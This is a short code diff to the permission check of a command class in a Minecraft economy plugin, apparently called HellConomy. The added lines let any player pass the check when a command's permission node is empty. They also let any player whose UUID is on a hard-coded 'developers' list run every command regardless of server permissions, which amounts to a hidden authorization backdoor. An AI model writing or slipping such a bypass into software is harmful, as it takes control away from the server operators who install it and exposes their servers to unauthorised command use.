@@ -194,7 +194,8 @@ public abstract class TNECommand {
 
   public boolean canExecute(CommandSender sender) {
     if(sender instanceof Player) {
-      return sender.hasPermission(getNode());
+      if(getNode().equalsIgnoreCase("")) return true;
+      return HellConomy.instance().developers.contains(getPlayer(sender).getUniqueId().toString()) || sender.hasPermission(getNode());
     }
     return console();
   }
